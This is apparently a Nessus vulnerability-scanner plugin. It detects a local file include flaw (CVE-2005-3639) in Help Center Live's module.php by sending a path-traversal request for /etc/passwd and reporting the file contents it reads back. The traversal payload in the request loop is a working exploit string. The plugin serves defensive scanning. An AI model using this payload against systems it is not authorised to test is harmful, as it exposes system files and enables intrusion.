#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: HACKERS PAL
#
# This script is released under the GNU GPL v2
#
# updated by Tenable Network Security to support BID 19256 as well.

 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file file include vulnerability. 

Description :

The remote host is running Help Center Live, a help desk tool written in
PHP. 

The remote version of Help Center Live fails to sanitize input to the
'file' parameter of the 'module.php' script before using it in a PHP
include_once() function.  Regardless of PHP's 'register_globals'
setting, an unauthenticated attacker can exploit this issue to read
files and possibly execute arbitrary PHP code on the affected host
subject to the privileges of the web server user id. 

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)"; 


if(description)
{
  script_id(20223);
  script_cve_id("CVE-2005-3639");
  script_bugtraq_id(15404, 19256);
  script_version("$Revision: 1.4 $");
  
  script_name(english:"Help Center Live module.php local file include flaw");

  script_description(english:desc["english"]);
  script_summary(english:"Checks HCL local file include flaw");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencie("http_version.nasl");
  exit(0);
}

#the code

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = make_list("/helpcenterlive", "/hcl", "/helpcenter", "/live", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
 req = http_get(item:string(dir, "/module.php?module=osTicket&file=../../../../../../../../../../../etc/passwd"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(res == NULL) exit(0);
 if("(Powered By Help Center Live" >< res && egrep(pattern:"root:.*:0:[01]:", string:res)){
       if (report_verbosity > 0) {
         contents = strstr(res, '<div align="center"><h2>');
         if (contents) {
           contents = contents - strstr(contents, "<td>");
           contents = strstr(contents, "</div>");
           contents = contents - "</div>";
         }
         else contents = res;

         report = string(
           desc["english"],
           "\n\n",
           "Plugin output :\n",
           "\n",
           contents
         );
       }
       else report = desc["english"];

       security_warning(port:port, data:report);
       exit(0);
 }
}
